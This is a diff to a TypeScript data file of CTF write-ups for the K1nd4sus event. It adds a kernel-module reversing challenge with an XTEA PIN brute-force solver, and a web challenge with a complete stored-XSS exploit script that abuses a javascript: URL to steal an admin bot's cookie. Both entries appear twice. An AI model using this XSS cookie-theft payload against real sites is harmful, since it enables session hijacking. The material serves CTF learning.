@@ -1,6 +1,6 @@
 import type { WriteUp } from '../types';
 
-// K1nd4sus CTF — 4 writeups
+// K 1nd 4sus — 8 writeups
 export const k1nd4susCtfWriteups: WriteUp[] = [
   {
     "id": "k1nd4sus-pwn-itsgoodbebackontheair",
@@ -204,6 +204,190 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
     ],
     "terminalOutputs": [],
     "flag": "KSUS{s4n1ty_ch3ck_QSL_7373}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "k1nd4sus-rev-ring0security",
+    "title": "- Ring 0 Security (?)",
+    "category": "Reverse",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "K 1nd 4sus",
+    "tags": [],
+    "description": "Writeup for challenge - Ring 0 Security (?)",
+    "problemDescription": "Challenge ini ngasih modul kernel Linux (`decoder.ko`) dan petunjuk kalau ada PIN 4 digit.\nTargetnya adalah dapetin flag dari mekanisme dekripsi di driver.\n\nHasil akhir:\n- PIN: `5102`\n- Flag: `KSUS{dr1v3r_cr4ck1ng_101}`",
+    "tools": [],
+    "analysis": "File yang tersedia:\n- `bzImage`\n- `initramfs.cpio.gz`\n- `qemu_run.sh`\n\n`qemu_run.sh` cuma boot kernel + initramfs ke shell minimal.\nSetelah ekstrak initramfs, file yang relevan hanya:\n- `init`\n- `challenge/decoder.ko`\n\nArtinya semua logika challenge memang ada di modul kernel itu.",
+    "solution": [
+      {
+        "title": "Reversing `decoder.ko`",
+        "content": "Dari simbol yang masih ada, fungsi penting:\n- `ctls` (handler ioctl)\n- `xtea_decrypt`\n- data global: `session_key`, `enc_flag`, `res`, `status`"
+      },
+      {
+        "title": "Alur ioctl",
+        "content": "Ada dua command utama di `ctls`:\n\n1. `0x401b3700`\n- Ambil 4 byte dari user (`copy_from_user`).\n- Masuk ke jalur `ctls.cold`.\n- Di jalur ini:\n  - `session_key[1] = 0xCAFEBABE`\n  - `session_key[0] = input | 0x13370000`\n  - `session_key[2..3] = 0xDEADBEEF, 0xFEEDFACE`\n\n2. `0x801b3701`\n- Copy `enc_flag` ke buffer `res`.\n- Dekripsi 4 blok (32 byte total) pakai XTEA decrypt 32 round.\n- `copy_to_user` hasil plaintext."
+      },
+      {
+        "title": "Bentuk key final",
+        "content": "Dari analisis relocation + disassembly, key yang dipakai decrypt adalah:\n\n- `k0 = 0x13370000 | pin`\n- `k1 = 0xCAFEBABE`\n- `k2 = 0xDEADBEEF`\n- `k3 = 0xFEEDFACE`\n\nIni bagian krusial. Waktu asumsi posisi key salah, plaintext jadi acak semua."
+      },
+      {
+        "title": "Solver",
+        "content": "Solver final disimpan di `solve.py`.\n\nCara jalanin:\n\n\n\nOutput yang diharapkan:",
+        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport struct\r\n\r\ndef xtea_decrypt_block(v0: int, v1: int, key_words):\r\n    sum_ = 0xC6EF3720\r\n    for _ in range(32):\r\n        v1 = (v1 - ((((v0 << 4) & 0xFFFFFFFF) ^ (v0 >> 5)) + v0 ^ ((sum_ + key_words[(sum_ >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF\r\n        sum_ = (sum_ - 0x9E3779B9) & 0xFFFFFFFF\r\n        v0 = (v0 - ((((v1 << 4) & 0xFFFFFFFF) ^ (v1 >> 5)) + v1 ^ ((sum_ + key_words[sum_ & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF\r\n    return v0, v1\r\n\r\n\r\ndef decrypt_flag(enc_flag: bytes, key_words):\r\n    out = bytearray()\r\n    for i in range(0, len(enc_flag), 8):\r\n        v0, v1 = struct.unpack('<2I', enc_flag[i:i + 8])\r\n        d0, d1 = xtea_decrypt_block(v0, v1, key_words)\r\n        out.extend(struct.pack('<2I', d0, d1))\r\n    return bytes(out)\r\n\r\n\r\ndef main():\r\n    # Ciphertext flag (enc_flag) dari decoder.ko hasil reversing section .data.\r\n    enc_flag = bytes.fromhex(\r\n        '7e38614d358f6d302e25c10149953ef9'\r\n        'b09cf265ff9459ec57fcb593b833c7b6'\r\n    )\r\n\r\n    for pin in range(10000):\r\n        key = [\r\n            0x13370000 | pin,  # session_key[0] <- pin via ioctl 0x401b3700\r\n            0xCAFEBABE,         # session_key[1] set di ctls.cold\r\n            0xDEADBEEF,         # session_key[2]\r\n            0xFEEDFACE,         # session_key[3]\r\n        ]\r\n\r\n        pt = decrypt_flag(enc_flag, key)\r\n        if b'KSUS{' in pt and b'}' in pt:\r\n            flag = pt.split(b'\\x00', 1)[0].decode('ascii', errors='ignore')\r\n            print(f'[+] PIN  : {pin:04d}')\r\n            print(f'[+] FLAG : {flag}')\r\n            return\r\n\r\n    print('[-] Flag tidak ditemukan')\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "KSUS{dr1v3r_cr4ck1ng_101}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "k1nd4sus-web-spotivibe1",
+    "title": "SpotiVibe 1 (Web Misc)",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "K 1nd 4sus",
+    "tags": [],
+    "description": "Writeup for challenge SpotiVibe 1 (Web Misc)",
+    "problemDescription": "The app has an admin review bot that visits reported songs and sets a `flag` cookie before opening the song page.\n\nThe bug is in Spotify URL validation:\n- It checks `hostname == open.spotify.com`\n- It checks `path.startswith(\"/embed/\")`\n- It does **not** check URL scheme (`http/https` only)\n\nBecause of this, a `javascript:` URL can pass validation if crafted as:\n- `javascript://open.spotify.com/embed/...`\n\nThen the song page places it directly into:\n```html\n<iframe src=\"{{ song.spotify_url }}\">\n```\n\nSo when admin bot loads the page, JavaScript executes and can read `document.cookie`, including:\n- `flag=KSUS{...}`",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Challenge Info",
+        "content": "- Category: Web Misc\n- Title: SpotiVibe 1\n- Target: `http://chall.k1nd4sus.it:30502`"
+      },
+      {
+        "title": "Root Cause",
+        "content": "In `is_valid_spotify_url(url)`:\n- `parsed.hostname` is trusted\n- `parsed.path` is trusted\n- no scheme allowlist is enforced\n\nThis allows script URLs disguised with a fake authority/path structure."
+      },
+      {
+        "title": "Exploit Strategy",
+        "content": "Direct exfiltration to external webhook is not necessary.\n\nInstead, payload does this inside bot browser:\n1. `fetch('/logout')`\n2. Login as attacker account\n3. `POST /add_song` with:\n   - `title = document.cookie`\n   - valid spotify URL in `spotify_url`\n\nNow the stolen cookie string (containing `flag=...`) is stored as a song title in our own account.\n\nAfter reporting the malicious song, bot visits it and runs payload.  \nWe then poll `/dashboard` and read the new song title to extract the flag."
+      },
+      {
+        "title": "Solver",
+        "content": "File: `solver.py`"
+      },
+      {
+        "title": "Run",
+        "content": "Expected output:",
+        "code": "source /home/nata/ctf_env/bin/activate\npython3 solver.py"
+      },
+      {
+        "title": "Notes",
+        "content": "- The exploit is reliable because bot explicitly sets cookie:\n  - name: `flag`\n  - path: `/`\n  - `httpOnly: False`\n- If network timing is slow, run solver again (it already includes polling/retry logic)."
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solver.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport time\r\nimport urllib.parse\r\n\r\nimport requests\r\n\r\n\r\nBASE_URL = \"http://chall.k1nd4sus.it:30502\"\r\n\r\n\r\ndef extract_song_ids(html: str):\r\n    return re.findall(r\"/song/(\\d+)\", html)\r\n\r\n\r\ndef extract_titles(html: str):\r\n    return re.findall(r'<a href=\"/song/\\d+\">\\s*([^<]+?)\\s*</a>', html)\r\n\r\n\r\ndef main():\r\n    s = requests.Session()\r\n\r\n    username = f\"atk_{int(time.time())}\"\r\n    password = username\r\n\r\n    s.post(\r\n        f\"{BASE_URL}/register\",\r\n        data={\"username\": username, \"password\": password},\r\n        timeout=10,\r\n    )\r\n\r\n    login = s.post(\r\n        f\"{BASE_URL}/login\",\r\n        data={\"username\": username, \"password\": password},\r\n        allow_redirects=False,\r\n        timeout=10,\r\n    )\r\n    if login.status_code != 302:\r\n        raise RuntimeError(\"Login failed\")\r\n\r\n    js = (\r\n        \"(async()=>{\"\r\n        \"await fetch('/logout');\"\r\n        f\"await fetch('/login',{{method:'POST',body:new URLSearchParams({{username:'{username}',password:'{password}'}})}});\"\r\n        \"await fetch('/add_song',{method:'POST',body:new URLSearchParams({title:document.cookie,spotify_url:'//open.spotify.com/embed/track/1'})});\"\r\n        \"})()\"\r\n    )\r\n    payload = \"javascript://open.spotify.com/embed/%0a\" + urllib.parse.quote(\r\n        js, safe=\"(){}=>'/.:,;+*[]\"\r\n    )\r\n\r\n    add = s.post(\r\n        f\"{BASE_URL}/add_song\",\r\n        data={\"title\": \"pwnsong\", \"spotify_url\": payload},\r\n        allow_redirects=True,\r\n        timeout=10,\r\n    )\r\n    if add.status_code != 200:\r\n        raise RuntimeError(\"Failed to store payload song\")\r\n\r\n    dashboard = s.get(f\"{BASE_URL}/dashboard\", timeout=10)\r\n    song_ids = extract_song_ids(dashboard.text)\r\n    if not song_ids:\r\n        raise RuntimeError(\"No song found in dashboard\")\r\n\r\n    target_song_id = song_ids[-1]\r\n\r\n    report = s.post(f\"{BASE_URL}/report\", data={\"song_id\": target_song_id}, timeout=10)\r\n    if report.status_code != 200:\r\n        raise RuntimeError(\"Report failed\")\r\n\r\n    flag = None\r\n    for _ in range(20):\r\n        time.sleep(3)\r\n        dashboard = s.get(f\"{BASE_URL}/dashboard\", timeout=10)\r\n        titles = extract_titles(dashboard.text)\r\n        for t in titles:\r\n            m = re.search(r\"KSUS\\{[^}]+\\}\", t)\r\n            if m:\r\n                flag = m.group(0)\r\n                break\r\n        if flag:\r\n            break\r\n\r\n    if not flag:\r\n        raise RuntimeError(\"Flag not found. Try running again.\")\r\n\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "KSUS{4b4eba6646f7903fd437d6fbf1b5783d}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "k1nd4sus-rev-ring0security-image",
+    "title": "- Ring 0 Security (?)",
+    "category": "Reverse",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "K 1nd 4sus",
+    "tags": [],
+    "description": "Writeup for challenge - Ring 0 Security (?)",
+    "problemDescription": "Challenge ini ngasih modul kernel Linux (`decoder.ko`) dan petunjuk kalau ada PIN 4 digit.\nTargetnya adalah dapetin flag dari mekanisme dekripsi di driver.\n\nHasil akhir:\n- PIN: `5102`\n- Flag: `KSUS{dr1v3r_cr4ck1ng_101}`",
+    "tools": [],
+    "analysis": "File yang tersedia:\n- `bzImage`\n- `initramfs.cpio.gz`\n- `qemu_run.sh`\n\n`qemu_run.sh` cuma boot kernel + initramfs ke shell minimal.\nSetelah ekstrak initramfs, file yang relevan hanya:\n- `init`\n- `challenge/decoder.ko`\n\nArtinya semua logika challenge memang ada di modul kernel itu.",
+    "solution": [
+      {
+        "title": "Reversing `decoder.ko`",
+        "content": "Dari simbol yang masih ada, fungsi penting:\n- `ctls` (handler ioctl)\n- `xtea_decrypt`\n- data global: `session_key`, `enc_flag`, `res`, `status`"
+      },
+      {
+        "title": "Alur ioctl",
+        "content": "Ada dua command utama di `ctls`:\n\n1. `0x401b3700`\n- Ambil 4 byte dari user (`copy_from_user`).\n- Masuk ke jalur `ctls.cold`.\n- Di jalur ini:\n  - `session_key[1] = 0xCAFEBABE`\n  - `session_key[0] = input | 0x13370000`\n  - `session_key[2..3] = 0xDEADBEEF, 0xFEEDFACE`\n\n2. `0x801b3701`\n- Copy `enc_flag` ke buffer `res`.\n- Dekripsi 4 blok (32 byte total) pakai XTEA decrypt 32 round.\n- `copy_to_user` hasil plaintext."
+      },
+      {
+        "title": "Bentuk key final",
+        "content": "Dari analisis relocation + disassembly, key yang dipakai decrypt adalah:\n\n- `k0 = 0x13370000 | pin`\n- `k1 = 0xCAFEBABE`\n- `k2 = 0xDEADBEEF`\n- `k3 = 0xFEEDFACE`\n\nIni bagian krusial. Waktu asumsi posisi key salah, plaintext jadi acak semua."
+      },
+      {
+        "title": "Solver",
+        "content": "Solver final disimpan di `solve.py`.\n\nCara jalanin:\n\n\n\nOutput yang diharapkan:",
+        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport struct\r\n\r\ndef xtea_decrypt_block(v0: int, v1: int, key_words):\r\n    sum_ = 0xC6EF3720\r\n    for _ in range(32):\r\n        v1 = (v1 - ((((v0 << 4) & 0xFFFFFFFF) ^ (v0 >> 5)) + v0 ^ ((sum_ + key_words[(sum_ >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF\r\n        sum_ = (sum_ - 0x9E3779B9) & 0xFFFFFFFF\r\n        v0 = (v0 - ((((v1 << 4) & 0xFFFFFFFF) ^ (v1 >> 5)) + v1 ^ ((sum_ + key_words[sum_ & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF\r\n    return v0, v1\r\n\r\n\r\ndef decrypt_flag(enc_flag: bytes, key_words):\r\n    out = bytearray()\r\n    for i in range(0, len(enc_flag), 8):\r\n        v0, v1 = struct.unpack('<2I', enc_flag[i:i + 8])\r\n        d0, d1 = xtea_decrypt_block(v0, v1, key_words)\r\n        out.extend(struct.pack('<2I', d0, d1))\r\n    return bytes(out)\r\n\r\n\r\ndef main():\r\n    # Ciphertext flag (enc_flag) dari decoder.ko hasil reversing section .data.\r\n    enc_flag = bytes.fromhex(\r\n        '7e38614d358f6d302e25c10149953ef9'\r\n        'b09cf265ff9459ec57fcb593b833c7b6'\r\n    )\r\n\r\n    for pin in range(10000):\r\n        key = [\r\n            0x13370000 | pin,  # session_key[0] <- pin via ioctl 0x401b3700\r\n            0xCAFEBABE,         # session_key[1] set di ctls.cold\r\n            0xDEADBEEF,         # session_key[2]\r\n            0xFEEDFACE,         # session_key[3]\r\n        ]\r\n\r\n        pt = decrypt_flag(enc_flag, key)\r\n        if b'KSUS{' in pt and b'}' in pt:\r\n            flag = pt.split(b'\\x00', 1)[0].decode('ascii', errors='ignore')\r\n            print(f'[+] PIN  : {pin:04d}')\r\n            print(f'[+] FLAG : {flag}')\r\n            return\r\n\r\n    print('[-] Flag tidak ditemukan')\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "KSUS{dr1v3r_cr4ck1ng_101}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "k1nd4sus-web-spotivibe1-spotivibe1",
+    "title": "SpotiVibe 1 (Web Misc)",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "K 1nd 4sus",
+    "tags": [],
+    "description": "Writeup for challenge SpotiVibe 1 (Web Misc)",
+    "problemDescription": "The app has an admin review bot that visits reported songs and sets a `flag` cookie before opening the song page.\n\nThe bug is in Spotify URL validation:\n- It checks `hostname == open.spotify.com`\n- It checks `path.startswith(\"/embed/\")`\n- It does **not** check URL scheme (`http/https` only)\n\nBecause of this, a `javascript:` URL can pass validation if crafted as:\n- `javascript://open.spotify.com/embed/...`\n\nThen the song page places it directly into:\n```html\n<iframe src=\"{{ song.spotify_url }}\">\n```\n\nSo when admin bot loads the page, JavaScript executes and can read `document.cookie`, including:\n- `flag=KSUS{...}`",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Challenge Info",
+        "content": "- Category: Web Misc\n- Title: SpotiVibe 1\n- Target: `http://chall.k1nd4sus.it:30502`"
+      },
+      {
+        "title": "Root Cause",
+        "content": "In `is_valid_spotify_url(url)`:\n- `parsed.hostname` is trusted\n- `parsed.path` is trusted\n- no scheme allowlist is enforced\n\nThis allows script URLs disguised with a fake authority/path structure."
+      },
+      {
+        "title": "Exploit Strategy",
+        "content": "Direct exfiltration to external webhook is not necessary.\n\nInstead, payload does this inside bot browser:\n1. `fetch('/logout')`\n2. Login as attacker account\n3. `POST /add_song` with:\n   - `title = document.cookie`\n   - valid spotify URL in `spotify_url`\n\nNow the stolen cookie string (containing `flag=...`) is stored as a song title in our own account.\n\nAfter reporting the malicious song, bot visits it and runs payload.  \nWe then poll `/dashboard` and read the new song title to extract the flag."
+      },
+      {
+        "title": "Solver",
+        "content": "File: `solver.py`"
+      },
+      {
+        "title": "Run",
+        "content": "Expected output:",
+        "code": "source /home/nata/ctf_env/bin/activate\npython3 solver.py"
+      },
+      {
+        "title": "Notes",
+        "content": "- The exploit is reliable because bot explicitly sets cookie:\n  - name: `flag`\n  - path: `/`\n  - `httpOnly: False`\n- If network timing is slow, run solver again (it already includes polling/retry logic)."
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solver.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport time\r\nimport urllib.parse\r\n\r\nimport requests\r\n\r\n\r\nBASE_URL = \"http://chall.k1nd4sus.it:30502\"\r\n\r\n\r\ndef extract_song_ids(html: str):\r\n    return re.findall(r\"/song/(\\d+)\", html)\r\n\r\n\r\ndef extract_titles(html: str):\r\n    return re.findall(r'<a href=\"/song/\\d+\">\\s*([^<]+?)\\s*</a>', html)\r\n\r\n\r\ndef main():\r\n    s = requests.Session()\r\n\r\n    username = f\"atk_{int(time.time())}\"\r\n    password = username\r\n\r\n    s.post(\r\n        f\"{BASE_URL}/register\",\r\n        data={\"username\": username, \"password\": password},\r\n        timeout=10,\r\n    )\r\n\r\n    login = s.post(\r\n        f\"{BASE_URL}/login\",\r\n        data={\"username\": username, \"password\": password},\r\n        allow_redirects=False,\r\n        timeout=10,\r\n    )\r\n    if login.status_code != 302:\r\n        raise RuntimeError(\"Login failed\")\r\n\r\n    js = (\r\n        \"(async()=>{\"\r\n        \"await fetch('/logout');\"\r\n        f\"await fetch('/login',{{method:'POST',body:new URLSearchParams({{username:'{username}',password:'{password}'}})}});\"\r\n        \"await fetch('/add_song',{method:'POST',body:new URLSearchParams({title:document.cookie,spotify_url:'//open.spotify.com/embed/track/1'})});\"\r\n        \"})()\"\r\n    )\r\n    payload = \"javascript://open.spotify.com/embed/%0a\" + urllib.parse.quote(\r\n        js, safe=\"(){}=>'/.:,;+*[]\"\r\n    )\r\n\r\n    add = s.post(\r\n        f\"{BASE_URL}/add_song\",\r\n        data={\"title\": \"pwnsong\", \"spotify_url\": payload},\r\n        allow_redirects=True,\r\n        timeout=10,\r\n    )\r\n    if add.status_code != 200:\r\n        raise RuntimeError(\"Failed to store payload song\")\r\n\r\n    dashboard = s.get(f\"{BASE_URL}/dashboard\", timeout=10)\r\n    song_ids = extract_song_ids(dashboard.text)\r\n    if not song_ids:\r\n        raise RuntimeError(\"No song found in dashboard\")\r\n\r\n    target_song_id = song_ids[-1]\r\n\r\n    report = s.post(f\"{BASE_URL}/report\", data={\"song_id\": target_song_id}, timeout=10)\r\n    if report.status_code != 200:\r\n        raise RuntimeError(\"Report failed\")\r\n\r\n    flag = None\r\n    for _ in range(20):\r\n        time.sleep(3)\r\n        dashboard = s.get(f\"{BASE_URL}/dashboard\", timeout=10)\r\n        titles = extract_titles(dashboard.text)\r\n        for t in titles:\r\n            m = re.search(r\"KSUS\\{[^}]+\\}\", t)\r\n            if m:\r\n                flag = m.group(0)\r\n                break\r\n        if flag:\r\n            break\r\n\r\n    if not flag:\r\n        raise RuntimeError(\"Flag not found. Try running again.\")\r\n\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "KSUS{4b4eba6646f7903fd437d6fbf1b5783d}",
     "lessonsLearned": ""
   }
 ];
